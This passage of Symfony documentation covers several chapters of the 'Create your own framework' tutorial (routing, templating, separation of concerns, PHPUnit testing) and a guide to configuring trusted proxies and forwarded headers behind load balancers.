third-party libraries (Doctrine, Propel or plain-old PDO for the Model; PHP or
Twig for the View).

When creating a framework, following the MVC pattern is not the right goal. The
main goal should be the **Separation of Concerns**; this is probably the only
design pattern that you should really care about. The fundamental principles of
the Symfony Components are focused on the HTTP specification. As such, the
framework that you are going to create should be more accurately labelled as a
HTTP framework or Request/Response framework.

Before You Start
----------------

Reading about how to create a framework is not enough. You will have to follow
along and actually type all the examples included in this tutorial. For that,
you need a recent version of PHP (7.4 or later is good enough), a web server
(like Apache, nginx or PHP's built-in web server), a good knowledge of PHP and
an understanding of Object Oriented Programming.

Ready to go? Read on!

Bootstrapping
-------------

Before you can even think of creating the first framework, you need to think
about some conventions: where you will store the code, how you will name the
classes, how you will reference external dependencies, etc.

To store your new framework, create a directory somewhere on your machine:

.. code-block:: terminal

    $ mkdir framework
    $ cd framework

Dependency Management
~~~~~~~~~~~~~~~~~~~~~

To install the Symfony Components that you need for your framework, you are going
to use `Composer`_, a project dependency manager for PHP. If you don't have it
yet, `download and install Composer`_ now.

Our Project
-----------

Instead of creating our framework from scratch, we are going to write the same
"application" over and over again, adding one abstraction at a time. Let's
start with the simplest web application we can think of in PHP::

    // framework/index.php
    $name = $_GET['name'];

    printf('Hello %s', $name);

You can use the :doc:`Symfony Local Web Server </setup/symfony_server>` to test
this great application in a browser
(``http://localhost:8000/index.php?name=Fabien``):

.. code-block:: terminal

    $ symfony server:start

In the :doc:`next chapter </create_framework/http_foundation>`, we are going to
introduce the HttpFoundation Component and see what it brings us.

.. _`Symfony`: https://symfony.com/
.. _`Composer`: https://getcomposer.org/
.. _`download and install Composer`: https://getcomposer.org/download/
* :doc:`/create_framework/introduction`
* :doc:`/create_framework/http_foundation`
* :doc:`/create_framework/front_controller`
* :doc:`/create_framework/routing`
* :doc:`/create_framework/templating`
* :doc:`/create_framework/http_kernel_controller_resolver`
* :doc:`/create_framework/separation_of_concerns`
* :doc:`/create_framework/unit_testing`
* :doc:`/create_framework/event_dispatcher`
* :doc:`/create_framework/http_kernel_httpkernelinterface`
* :doc:`/create_framework/http_kernel_httpkernel_class`
* :doc:`/create_framework/dependency_injection`
The Routing Component
=====================

Before we start diving into the Routing component, let's refactor our current
framework just a little to make templates even more readable::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    $request = Request::createFromGlobals();

    $map = [
        '/hello' => 'hello',
        '/bye'   => 'bye',
    ];

    $path = $request->getPathInfo();
    if (isset($map[$path])) {
        ob_start();
        extract($request->query->all(), EXTR_SKIP);
        include sprintf(__DIR__.'/../src/pages/%s.php', $map[$path]);
        $response = new Response(ob_get_clean());
    } else {
        $response = new Response('Not Found', 404);
    }

    $response->send();

As we now extract the request query parameters, simplify the ``hello.php``
template as follows:

.. code-block:: html+php

    <!-- example.com/src/pages/hello.php -->
    Hello <?= htmlspecialchars($name ?? 'World', ENT_QUOTES, 'UTF-8') ?>

Now, we are in good shape to add new features.

One very important aspect of any website is the form of its URLs. Thanks to
the URL map, we have decoupled the URL from the code that generates the
associated response, but it is not yet flexible enough. For instance, we might
want to support dynamic paths to allow embedding data directly into the URL
(e.g. ``/hello/Fabien``) instead of relying on a query string (e.g. ``/hello?name=Fabien``).

To support this feature, add the Symfony Routing component as a dependency:

.. code-block:: terminal

    $ composer require symfony/routing

Instead of an array for the URL map, the Routing component relies on a
``RouteCollection`` instance::

    use Symfony\Component\Routing\RouteCollection;

    $routes = new RouteCollection();

Let's add a route that describes the ``/hello/SOMETHING`` URL and add another
one for the simple ``/bye`` one::

    use Symfony\Component\Routing\Route;

    $routes->add('hello', new Route('/hello/{name}', ['name' => 'World']));
    $routes->add('bye', new Route('/bye'));

Each entry in the collection is defined by a name (``hello``) and a ``Route``
instance, which is defined by a route pattern (``/hello/{name}``) and an array
of default values for route attributes (``['name' => 'World']``).

.. note::

    Read the :doc:`Routing documentation </routing>` to learn more about
    its many features like URL generation, attribute requirements, HTTP
    method enforcement, loaders for YAML or XML files, dumpers to PHP or
    Apache rewrite rules for enhanced performance and much more.

Based on the information stored in the ``RouteCollection`` instance, a
``UrlMatcher`` instance can match URL paths::

    use Symfony\Component\Routing\Matcher\UrlMatcher;
    use Symfony\Component\Routing\RequestContext;

    $context = new RequestContext();
    $context->fromRequest($request);
    $matcher = new UrlMatcher($routes, $context);

    $attributes = $matcher->match($request->getPathInfo());

The ``match()`` method takes a request path and returns an array of attributes
(notice that the matched route is automatically stored under the special
``_route`` attribute)::

    $matcher->match('/bye');
    /* Result:
    [
        '_route' => 'bye',
    ];
    */

    $matcher->match('/hello/Fabien');
    /* Result:
    [
        'name' => 'Fabien',
        '_route' => 'hello',
    ];
    */

    $matcher->match('/hello');
    /* Result:
    [
        'name' => 'World',
        '_route' => 'hello',
    ];
    */

.. note::

    Even if we don't strictly need the request context in our examples, it is
    used in real-world applications to enforce method requirements and more.

The URL matcher throws an exception when none of the routes match::

    $matcher->match('/not-found');

    // throws a Symfony\Component\Routing\Exception\ResourceNotFoundException

With this knowledge in mind, let's write the new version of our framework::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing;

    $request = Request::createFromGlobals();
    $routes = include __DIR__.'/../src/app.php';

    $context = new Routing\RequestContext();
    $context->fromRequest($request);
    $matcher = new Routing\Matcher\UrlMatcher($routes, $context);

    try {
        extract($matcher->match($request->getPathInfo()), EXTR_SKIP);
        ob_start();
        include sprintf(__DIR__.'/../src/pages/%s.php', $_route);

        $response = new Response(ob_get_clean());
    } catch (Routing\Exception\ResourceNotFoundException $exception) {
        $response = new Response('Not Found', 404);
    } catch (Exception $exception) {
        $response = new Response('An error occurred', 500);
    }

    $response->send();

There are a few new things in the code:

* Route names are used for template names;

* ``500`` errors are now managed correctly;

* Request attributes are extracted to keep our templates simple:

.. code-block:: html+php

    // example.com/src/pages/hello.php
    Hello <?= htmlspecialchars($name, ENT_QUOTES, 'UTF-8') ?>

* Route configuration has been moved to its own file::

    // example.com/src/app.php
    use Symfony\Component\Routing;

    $routes = new Routing\RouteCollection();
    $routes->add('hello', new Routing\Route('/hello/{name}', ['name' => 'World']));
    $routes->add('bye', new Routing\Route('/bye'));

    return $routes;

We now have a clear separation between the configuration (everything
specific to our application in ``app.php``) and the framework (the generic
code that powers our application in ``front.php``).

With less than 30 lines of code, we have a new framework, more powerful and
more flexible than the previous one. Enjoy!

Using the Routing component has one big additional benefit: the ability to
generate URLs based on Route definitions. When using both URL matching and URL
generation in your code, changing the URL patterns should have no other
impact. You can use the generator this way::

    use Symfony\Component\Routing;

    $generator = new Routing\Generator\UrlGenerator($routes, $context);

    echo $generator->generate('hello', ['name' => 'Fabien']);
    // outputs /hello/Fabien

The code should be self-explanatory; and thanks to the context, you can even
generate absolute URLs::

    use Symfony\Component\Routing\Generator\UrlGeneratorInterface;

    echo $generator->generate(
        'hello',
        ['name' => 'Fabien'],
        UrlGeneratorInterface::ABSOLUTE_URL
    );
    // outputs something like http://example.com/somewhere/hello/Fabien

.. tip::

    Concerned about performance? Based on your route definitions, create a
    highly optimized URL matcher class that can replace the default
    ``UrlMatcher``::

        use Symfony\Component\Routing\Matcher\CompiledUrlMatcher;
        use Symfony\Component\Routing\Matcher\Dumper\CompiledUrlMatcherDumper;

        // $compiledRoutes is a plain PHP array that describes all routes in a performant data format
        // you can (and should) cache it, typically by exporting it to a PHP file
        $compiledRoutes = (new CompiledUrlMatcherDumper($routes))->getCompiledRoutes();

        $matcher = new CompiledUrlMatcher($compiledRoutes, $context);
The Separation of Concerns
==========================

One down-side of our framework right now is that we need to copy and paste the
code in ``front.php`` each time we create a new website. 60 lines of code is
not that much, but it would be nice if we could wrap this code into a proper
class. It would bring us better *reusability* and easier testing to name just
a few benefits.

If you have a closer look at the code, ``front.php`` has one input, the
Request and one output, the Response. Our framework class will follow this
simple principle: the logic is about creating the Response associated with a
Request.

Let's create our very own namespace for our framework: ``Simplex``. Move the
request handling logic into its own ``Simplex\Framework`` class::

    // example.com/src/Simplex/Framework.php
    namespace Simplex;

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Controller\ArgumentResolver;
    use Symfony\Component\HttpKernel\Controller\ControllerResolver;
    use Symfony\Component\Routing\Exception\ResourceNotFoundException;
    use Symfony\Component\Routing\Matcher\UrlMatcher;

    class Framework
    {
        public function __construct(
            private UrlMatcher $matcher,
            private ControllerResolver $controllerResolver,
            private ArgumentResolver $argumentResolver,
        ) {
        }

        public function handle(Request $request): Response
        {
            $this->matcher->getContext()->fromRequest($request);

            try {
                $request->attributes->add($this->matcher->match($request->getPathInfo()));

                $controller = $this->controllerResolver->getController($request);
                $arguments = $this->argumentResolver->getArguments($request, $controller);

                return call_user_func_array($controller, $arguments);
            } catch (ResourceNotFoundException $exception) {
                return new Response('Not Found', 404);
            } catch (\Exception $exception) {
                return new Response('An error occurred', 500);
            }
        }
    }

And update ``example.com/web/front.php`` accordingly::

    // example.com/web/front.php

    // ...
    $request = Request::createFromGlobals();
    $routes = include __DIR__.'/../src/app.php';

    $context = new Routing\RequestContext();
    $matcher = new Routing\Matcher\UrlMatcher($routes, $context);

    $controllerResolver = new ControllerResolver();
    $argumentResolver = new ArgumentResolver();

    $framework = new Simplex\Framework($matcher, $controllerResolver, $argumentResolver);
    $response = $framework->handle($request);

    $response->send();

To wrap up the refactoring, let's move everything but routes definition from
``example.com/src/app.php`` into yet another namespace: ``Calendar``.

For the classes defined under the ``Simplex`` and ``Calendar`` namespaces to
be autoloaded, update the ``composer.json`` file:

.. code-block:: json

    {
        "...": "...",
        "autoload": {
            "psr-4": { "": "src/" }
        }
    }

.. note::

    For the Composer autoloader to be updated, run ``composer dump-autoload``.

Move the controller to ``Calendar\Controller\LeapYearController``::

    // example.com/src/Calendar/Controller/LeapYearController.php
    namespace Calendar\Controller;

    use Calendar\Model\LeapYear;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class LeapYearController
    {
        public function index(Request $request, int $year): Response
        {
            $leapYear = new LeapYear();
            if ($leapYear->isLeapYear($year)) {
                return new Response('Yep, this is a leap year!');
            }

            return new Response('Nope, this is not a leap year.');
        }
    }

And move the ``is_leap_year()`` function to its own class too::

    // example.com/src/Calendar/Model/LeapYear.php
    namespace Calendar\Model;

    class LeapYear
    {
        public function isLeapYear(?int $year = null): bool
        {
            if (null === $year) {
                $year = date('Y');
            }

            return 0 == $year % 400 || (0 == $year % 4 && 0 != $year % 100);
        }
    }

Don't forget to update the ``example.com/src/app.php`` file accordingly::

    $routes->add('leap_year', new Routing\Route('/is_leap_year/{year}', [
        'year' => null,
        '_controller' => 'Calendar\Controller\LeapYearController::index',
    ]));

To sum up, here is the new file layout:

.. code-block:: text

    example.com
    ├── composer.json
    ├── composer.lock
    ├── src
    │   ├── app.php
    │   └── Simplex
    │       └── Framework.php
    │   └── Calendar
    │       └── Controller
    │       │   └── LeapYearController.php
    │       └── Model
    │           └── LeapYear.php
    ├── vendor
    │   └── autoload.php
    └── web
        └── front.php

That's it! Our application has now four different layers and each of them has
a well-defined goal:

* ``web/front.php``: The front controller; the only exposed PHP code that
  makes the interface with the client (it gets the Request and sends the
  Response) and provides the boiler-plate code to initialize the framework and
  our application;

* ``src/Simplex``: The reusable framework code that abstracts the handling of
  incoming Requests (by the way, it makes your controllers/templates better
  testable -- more about that later on);

* ``src/Calendar``: Our application specific code (the controllers and the
  model);

* ``src/app.php``: The application configuration/framework customization.
Templating
==========

The astute reader has noticed that our framework hardcodes the way specific
"code" (the templates) is run. For simple pages like the ones we have created
so far, that's not a problem, but if you want to add more logic, you would be
forced to put the logic into the template itself, which is probably not a good
idea, especially if you still have the separation of concerns principle in
mind.

Let's separate the template code from the logic by adding a new layer: the
controller: *The controller's mission is to generate a Response based on the
information conveyed by the client's Request.*

Change the template rendering part of the framework to read as follows::

    // example.com/web/front.php

    // ...
    try {
        $request->attributes->add($matcher->match($request->getPathInfo()));
        $response = call_user_func('render_template', $request);
    } catch (Routing\Exception\ResourceNotFoundException $exception) {
        $response = new Response('Not Found', 404);
    } catch (Exception $exception) {
        $response = new Response('An error occurred', 500);
    }

As the rendering is now done by an external function (``render_template()``
here), we need to pass to it the attributes extracted from the URL. We could
have passed them as an additional argument to ``render_template()``, but
instead, let's use another feature of the ``Request`` class called
*attributes*: Request attributes is a way to attach additional information
about the Request that is not directly related to the HTTP Request data.

You can now create the ``render_template()`` function, a generic controller
that renders a template when there is no specific logic. To keep the same
template as before, request attributes are extracted before the template is
rendered::

    function render_template(Request $request): Response
    {
        extract($request->attributes->all(), EXTR_SKIP);
        ob_start();
        include sprintf(__DIR__.'/../src/pages/%s.php', $_route);

        return new Response(ob_get_clean());
    }

As ``render_template`` is used as an argument to the PHP ``call_user_func()``
function, we can replace it with any valid PHP `callbacks`_. This allows us to
use a function, an anonymous function or a method of a class as a
controller... your choice.

As a convention, for each route, the associated controller is configured via
the ``_controller`` route attribute::

    $routes->add('hello', new Routing\Route('/hello/{name}', [
        'name' => 'World',
        '_controller' => 'render_template',
    ]));

    try {
        $request->attributes->add($matcher->match($request->getPathInfo()));
        $response = call_user_func($request->attributes->get('_controller'), $request);
    } catch (Routing\Exception\ResourceNotFoundException $exception) {
        $response = new Response('Not Found', 404);
    } catch (Exception $exception) {
        $response = new Response('An error occurred', 500);
    }

A route can now be associated with any controller and within a controller, you
can still use the ``render_template()`` to render a template::

    $routes->add('hello', new Routing\Route('/hello/{name}', [
        'name' => 'World',
        '_controller' => function (Request $request): string {
            return render_template($request);
        }
    ]));

This is rather flexible as you can change the Response object afterwards and
you can even pass additional arguments to the template::

    $routes->add('hello', new Routing\Route('/hello/{name}', [
        'name' => 'World',
        '_controller' => function (Request $request): Response {
            // $foo will be available in the template
            $request->attributes->set('foo', 'bar');

            $response = render_template($request);

            // change some header
            $response->headers->set('Content-Type', 'text/plain');

            return $response;
        }
    ]));

Here is the updated and improved version of our framework::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing;

    function render_template(Request $request): Response
    {
        extract($request->attributes->all(), EXTR_SKIP);
        ob_start();
        include sprintf(__DIR__.'/../src/pages/%s.php', $_route);

        return new Response(ob_get_clean());
    }

    $request = Request::createFromGlobals();
    $routes = include __DIR__.'/../src/app.php';

    $context = new Routing\RequestContext();
    $context->fromRequest($request);
    $matcher = new Routing\Matcher\UrlMatcher($routes, $context);

    try {
        $request->attributes->add($matcher->match($request->getPathInfo()));
        $response = call_user_func($request->attributes->get('_controller'), $request);
    } catch (Routing\Exception\ResourceNotFoundException $exception) {
        $response = new Response('Not Found', 404);
    } catch (Exception $exception) {
        $response = new Response('An error occurred', 500);
    }

    $response->send();

To celebrate the birth of our new framework, let's create a brand new
application that needs some simple logic. Our application has one page that
says whether a given year is a leap year or not. When calling
``/is_leap_year``, you get the answer for the current year, but you can
also specify a year like in ``/is_leap_year/2009``. Being generic, the
framework does not need to be modified in any way, create a new
``app.php`` file::

    // example.com/src/app.php
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing;

    function is_leap_year(?int $year = null): bool
    {
        if (null === $year) {
            $year = (int)date('Y');
        }

        return 0 === $year % 400 || (0 === $year % 4 && 0 !== $year % 100);
    }

    $routes = new Routing\RouteCollection();
    $routes->add('leap_year', new Routing\Route('/is_leap_year/{year}', [
        'year' => null,
        '_controller' => function (Request $request): Response {
            if (is_leap_year($request->attributes->get('year'))) {
                return new Response('Yep, this is a leap year!');
            }

            return new Response('Nope, this is not a leap year.');
        }
    ]));

    return $routes;

The ``is_leap_year()`` function returns ``true`` when the given year is a leap
year, ``false`` otherwise. If the year is ``null``, the current year is
tested. The controller does little: it gets the year from the request
attributes, pass it to the ``is_leap_year()`` function, and according to the
return value it creates a new Response object.

As always, you can decide to stop here and use the framework as is; it's
probably all you need to create simple websites like those fancy one-page
`websites`_ and hopefully a few others.

.. _`callbacks`: https://www.php.net/manual/en/language.types.callable.php
.. _`websites`: https://kottke.org/08/02/single-serving-sites
Unit Testing
============

You might have noticed some subtle but nonetheless important bugs in the
framework we built in the previous chapter. When creating a framework, you
must be sure that it behaves as advertised. If not, all the applications based
on it will exhibit the same bugs. The good news is that whenever you fix a
bug, you are fixing a bunch of applications too.

Today's mission is to write unit tests for the framework we have created by
using `PHPUnit`_. At first, install PHPUnit as a development dependency:

.. code-block:: terminal

    $ composer require --dev phpunit/phpunit

Then, create a PHPUnit configuration file in ``example.com/phpunit.xml.dist``:

.. code-block:: xml

    <?xml version="1.0" encoding="UTF-8"?>
    <phpunit
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:noNamespaceSchemaLocation="https://schema.phpunit.de/9.3/phpunit.xsd"
        backupGlobals="false"
        colors="true"
        bootstrap="vendor/autoload.php"
    >
        <coverage processUncoveredFiles="true">
            <include>
                <directory suffix=".php">./src</directory>
            </include>
        </coverage>

        <testsuites>
            <testsuite name="Test Suite">
                <directory>./tests</directory>
            </testsuite>
        </testsuites>
    </phpunit>

This configuration defines sensible defaults for most PHPUnit settings; more
interesting, the autoloader is used to bootstrap the tests, and tests will be
stored under the ``example.com/tests/`` directory.

Now, let's write a test for "not found" resources. To avoid the creation of
all dependencies when writing tests and to really just unit-test what we want,
we are going to use `test doubles`_. Test doubles are easier to create when we
rely on interfaces instead of concrete classes. Fortunately, Symfony provides
such interfaces for core objects like the URL matcher and the controller
resolver. Modify the framework to make use of them::

    // example.com/src/Simplex/Framework.php
    namespace Simplex;

    // ...

    use Calendar\Controller\LeapYearController;
    use Symfony\Component\HttpKernel\Controller\ArgumentResolverInterface;
    use Symfony\Component\HttpKernel\Controller\ControllerResolverInterface;
    use Symfony\Component\Routing\Matcher\UrlMatcherInterface;

    class Framework
    {
        public function __construct(
            private UrlMatcherInterface $matcher,
            private ControllerResolverInterface $resolver,
            private ArgumentResolverInterface $argumentResolver,
        ) {
        }

        // ...
    }

We are now ready to write our first test::

    // example.com/tests/Simplex/Tests/FrameworkTest.php
    namespace Simplex\Tests;

    use PHPUnit\Framework\TestCase;
    use Simplex\Framework;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpKernel\Controller\ArgumentResolverInterface;
    use Symfony\Component\HttpKernel\Controller\ControllerResolverInterface;
    use Symfony\Component\Routing;
    use Symfony\Component\Routing\Exception\ResourceNotFoundException;

    class FrameworkTest extends TestCase
    {
        public function testNotFoundHandling(): void
        {
            $framework = $this->getFrameworkForException(new ResourceNotFoundException());

            $response = $framework->handle(new Request());

            $this->assertEquals(404, $response->getStatusCode());
        }

        private function getFrameworkForException($exception): Framework
        {
            $matcher = $this->createMock(Routing\Matcher\UrlMatcherInterface::class);

            $matcher
                ->expects($this->once())
                ->method('match')
                ->will($this->throwException($exception))
            ;
            $matcher
                ->expects($this->once())
                ->method('getContext')
                ->will($this->returnValue($this->createMock(Routing\RequestContext::class)))
            ;
            $controllerResolver = $this->createMock(ControllerResolverInterface::class);
            $argumentResolver = $this->createMock(ArgumentResolverInterface::class);

            return new Framework($matcher, $controllerResolver, $argumentResolver);
        }
    }

This test simulates a request that does not match any route. As such, the
``match()`` method returns a ``ResourceNotFoundException`` exception and we
are testing that our framework converts this exception to a 404 response.

Execute this test by running ``phpunit`` in the ``example.com`` directory:

.. code-block:: terminal

    $ ./vendor/bin/phpunit

.. note::

    If you don't understand what the hell is going on in the code, read the
    PHPUnit documentation on `test doubles`_.

After the test ran, you should see a green bar. If not, you have a bug
either in the test or in the framework code!

Adding a unit test for any exception thrown in a controller::

    public function testErrorHandling(): void
    {
        $framework = $this->getFrameworkForException(new \RuntimeException());

        $response = $framework->handle(new Request());

        $this->assertEquals(500, $response->getStatusCode());
    }

Last, but not the least, let's write a test for when we actually have a proper
Response::

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Controller\ArgumentResolver;
    use Symfony\Component\HttpKernel\Controller\ControllerResolver;
    // ...

    public function testControllerResponse(): void
    {
        $matcher = $this->createMock(Routing\Matcher\UrlMatcherInterface::class);

        $matcher
            ->expects($this->once())
            ->method('match')
            ->will($this->returnValue([
                '_route' => 'is_leap_year/{year}',
                'year' => '2000',
                '_controller' => [new LeapYearController(), 'index'],
            ]))
        ;
        $matcher
            ->expects($this->once())
            ->method('getContext')
            ->will($this->returnValue($this->createMock(Routing\RequestContext::class)))
        ;
        $controllerResolver = new ControllerResolver();
        $argumentResolver = new ArgumentResolver();

        $framework = new Framework($matcher, $controllerResolver, $argumentResolver);

        $response = $framework->handle(new Request());

        $this->assertEquals(200, $response->getStatusCode());
        $this->assertStringContainsString('Yep, this is a leap year!', $response->getContent());
    }

In this test, we simulate a route that matches and returns a simple
controller. We check that the response status is 200 and that its content is
the one we have set in the controller.

To check that we have covered all possible use cases, run the PHPUnit test
coverage feature (you need to enable `XDebug`_ first):

.. code-block:: terminal

    $ ./vendor/bin/phpunit --coverage-html=cov/

Open ``example.com/cov/src/Simplex/Framework.php.html`` in a browser and check
that all the lines for the Framework class are green (it means that they have
been visited when the tests were executed).

Alternatively you can output the result directly to the console:

.. code-block:: terminal

    $ ./vendor/bin/phpunit --coverage-text

Thanks to the clean object-oriented code that we have written so far, we have
been able to write unit-tests to cover all possible use cases of our
framework; test doubles ensured that we were actually testing our code and not
Symfony code.

Now that we are confident (again) about the code we have written, we can
safely think about the next batch of features we want to add to our framework.

.. _`PHPUnit`: https://docs.phpunit.de/en/9.6/
.. _`test doubles`: https://docs.phpunit.de/en/9.6/test-doubles.html
.. _`XDebug`: https://xdebug.org/
How to Configure Symfony to Work behind a Load Balancer or a Reverse Proxy
==========================================================================

When you deploy your application, you may be behind a load balancer (e.g.
an AWS Elastic Load Balancing) or a reverse proxy (e.g. Varnish for
:doc:`caching </http_cache>`).

For the most part, this doesn't cause any problems with Symfony. But, when
a request passes through a proxy, certain request information is sent using
either the standard ``Forwarded`` header or ``X-Forwarded-*`` headers. For example,
instead of reading the ``REMOTE_ADDR`` header (which will now be the IP address of
your reverse proxy), the user's true IP will be stored in a standard ``Forwarded: for="..."``
header or a ``X-Forwarded-For`` header.

If you don't configure Symfony to look for these headers, you'll get incorrect
information about the client's IP address, whether or not the client is connecting
via HTTPS, the client's port and the hostname being requested.

.. _request-set-trusted-proxies:

Solution: ``setTrustedProxies()``
---------------------------------

To fix this, you need to tell Symfony which reverse proxy IP addresses to trust
and what headers your reverse proxy uses to send information:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            # the IP address (or range) of your proxy
            trusted_proxies: '192.0.0.1,10.0.0.0/8'
            # shortcut for private IP address ranges of your proxy
            trusted_proxies: 'private_ranges'
            # trust *all* "X-Forwarded-*" headers
            trusted_headers: ['x-forwarded-for', 'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-port', 'x-forwarded-prefix']
            # or, if your proxy instead uses the "Forwarded" header
            trusted_headers: ['forwarded']

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- the IP address (or range) of your proxy -->
                <framework:trusted-proxies>192.0.0.1,10.0.0.0/8</framework:trusted-proxies>
                <!-- shortcut for private IP address ranges of your proxy -->
                <framework:trusted-proxies>private_ranges</framework:trusted-proxies>

                <!-- trust *all* "X-Forwarded-*" headers -->
                <framework:trusted-header>x-forwarded-for</framework:trusted-header>
                <framework:trusted-header>x-forwarded-host</framework:trusted-header>
                <framework:trusted-header>x-forwarded-proto</framework:trusted-header>
                <framework:trusted-header>x-forwarded-port</framework:trusted-header>
                <framework:trusted-header>x-forwarded-prefix</framework:trusted-header>

                <!-- or, if your proxy instead uses the "Forwarded" header -->
                <framework:trusted-header>forwarded</framework:trusted-header>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework
                // the IP address (or range) of your proxy
                ->trustedProxies('192.0.0.1,10.0.0.0/8')
                // shortcut for private IP address ranges of your proxy
                ->trustedProxies('private_ranges')
                // trust *all* "X-Forwarded-*" headers (the ! prefix means to not trust those headers)
                ->trustedHeaders(['x-forwarded-for', 'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-port', 'x-forwarded-prefix'])
                // or, if your proxy instead uses the "Forwarded" header
                ->trustedHeaders(['forwarded'])
            ;
        };

.. versionadded:: 7.1

    ``private_ranges`` as a shortcut for private IP address ranges for the
    ``trusted_proxies`` option was introduced in Symfony 7.1.

.. caution::

    Enabling the ``Request::HEADER_X_FORWARDED_HOST`` option exposes the
    application to `HTTP Host header attacks`_. Make sure the proxy really
    sends an ``x-forwarded-host`` header.

The Request object has several ``Request::HEADER_*`` constants that control exactly
*which* headers from your reverse proxy are trusted. The argument is a bit field,
so you can also pass your own value (e.g. ``0b00110``).

.. tip::

    You can set a ``TRUSTED_PROXIES`` env var to configure proxies on a per-environment basis:

    .. code-block:: bash

        # .env
        TRUSTED_PROXIES=127.0.0.1,10.0.0.0/8

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            trusted_proxies: '%env(TRUSTED_PROXIES)%'

.. danger::

    The "trusted proxies" feature does not work as expected when using the
    `nginx realip module`_. Disable that module when serving Symfony applications.

But what if the IP of my Reverse Proxy Changes Constantly!
----------------------------------------------------------

Some reverse proxies (like AWS Elastic Load Balancing) don't have a
static IP address or even a range that you can target with the CIDR notation.
In this case, you'll need to - *very carefully* - trust *all* proxies.

#. Configure your web server(s) to *not* respond to traffic from *any* clients
   other than your load balancers. For AWS, this can be done with `security groups`_.

#. Once you've guaranteed that traffic will only come from your trusted reverse
   proxies, configure Symfony to *always* trust incoming request:

   .. code-block:: yaml

       # config/packages/framework.yaml
       framework:
           # ...
           # trust *all* requests (the 'REMOTE_ADDR' string is replaced at
           # run time by $_SERVER['REMOTE_ADDR'])
           trusted_proxies: '127.0.0.1,REMOTE_ADDR'

That's it! It's critical that you prevent traffic from all non-trusted sources.
If you allow outside traffic, they could "spoof" their true IP address and
other information.

If you are also using a reverse proxy on top of your load balancer (e.g.
`CloudFront`_), calling ``$request->server->get('REMOTE_ADDR')`` won't be
enough, as it will only trust the node sitting directly above your application
(in this case your load balancer). You also need to append the IP addresses or
ranges of any additional proxy (e.g. `CloudFront IP ranges`_) to the array of
trusted proxies.

Reverse proxy in a subpath / subfolder
--------------------------------------

If your Symfony application runs behind a reverse proxy and it's served in a
subpath/subfolder, Symfony might generate incorrect URLs that ignore the
subpath/subfolder of the reverse proxy.

To fix this, you need to pass the subpath/subfolder route prefix of the reverse
proxy to Symfony by setting the ``X-Forwarded-Prefix`` header. The header can
normally be configured in your reverse proxy configuration. Configure
``X-Forwarded-Prefix`` as trusted header to be able to use this feature.

The ``X-Forwarded-Prefix`` is used by Symfony to prefix the base URL of request
objects, which is used to generate absolute paths and URLs in Symfony applications.
Without the header, the base URL would be only determined based on the configuration
of the web server running Symfony, which leads to incorrect paths/URLs, when the
application is served under a subpath/subfolder by a reverse proxy.

For example if your Symfony application is directly served under a URL like
``https://symfony.tld/`` and you would like to use a reverse proxy to serve the
application under ``https://public.tld/app/``, you would need to set the
``X-Forwarded-Prefix`` header to ``/app/`` in your reverse proxy configuration.
Without the header, Symfony would generate URLs based on its server base URL
(e.g. ``/my/route``) instead of the correct ``/app/my/route``, which is
required to access the route via the reverse proxy.

The header can be different for each reverse proxy, so that access via different
reverse proxies served under different subpaths/subfolders can be handled correctly.

Custom Headers When Using a Reverse Proxy
-----------------------------------------

Some reverse proxies (like `CloudFront`_ with ``CloudFront-Forwarded-Proto``)
may force you to use a custom header. For instance you have
``Custom-Forwarded-Proto`` instead of ``X-Forwarded-Proto``.

In this case, you'll need to set the header ``X-Forwarded-Proto`` with the value
of ``Custom-Forwarded-Proto`` early enough in your application, i.e. before
handling the request::

    // public/index.php

    // ...
    $_SERVER['HTTP_X_FORWARDED_PROTO'] = $_SERVER['HTTP_CUSTOM_FORWARDED_PROTO'];
    // ...
    $response = $kernel->handle($request);

Overriding Configuration Behind Hidden SSL Termination
------------------------------------------------------

Some cloud setups (like running a Docker container with the "Web App for Containers"
in `Microsoft Azure`_) do SSL termination and contact your web server over HTTP, but
do not change the remote address nor set the ``X-Forwarded-*`` headers. This means
the trusted proxy feature of Symfony can't help you.

Once you made sure your server is only reachable through the cloud proxy over HTTPS
and not through HTTP, you can override the information your web server sends to PHP.
For Nginx, this could look like this:

.. code-block:: nginx

    location ~ ^/index\.php$ {
        fastcgi_pass 127.0.0.1:9000;
        include fastcgi.conf;
        # Lie to Symfony about the protocol and port so that it generates the correct HTTPS URLs
        fastcgi_param SERVER_PORT "443";
        fastcgi_param HTTPS "on";
    }

.. _`security groups`: https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/elb-security-groups.html
.. _`CloudFront`: https://en.wikipedia.org/wiki/Amazon_CloudFront
.. _`CloudFront IP ranges`: https://ip-ranges.amazonaws.com/ip-ranges.json
